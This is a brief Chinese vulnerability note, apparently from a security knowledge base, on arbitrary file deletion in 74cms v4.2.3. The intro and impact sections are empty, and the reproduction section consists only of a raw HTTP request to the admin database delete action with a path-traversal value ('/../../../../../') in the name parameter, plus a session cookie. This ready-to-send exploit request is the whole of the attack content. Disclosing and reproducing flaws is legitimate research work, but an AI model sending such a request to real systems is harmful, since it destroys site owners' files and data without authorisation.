74cms v4.2.3 任意文件删除
=========================

一、漏洞简介
------------

二、漏洞影响
------------

三、复现过程
------------

    GET /index.php?m=admin&c=database&a=del&name=/../../../../../ HTTP/1.1
    Host: 0-sec.org
    User-Agent: Mozilla/5.0 (Android 9.0; Mobile; rv:61.0) Gecko/61.0 Firefox/61.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: en
    Accept-Encoding: gzip, deflate
    Referer: http://127.0.0.1/index.php?m=admin&c=database&a=restore
    Connection: close
    Cookie: think_template=default; PHPSESSID=6d86a34ec9125b2d08ebbb7630838682; think_language=en
    Upgrade-Insecure-Requests: 1
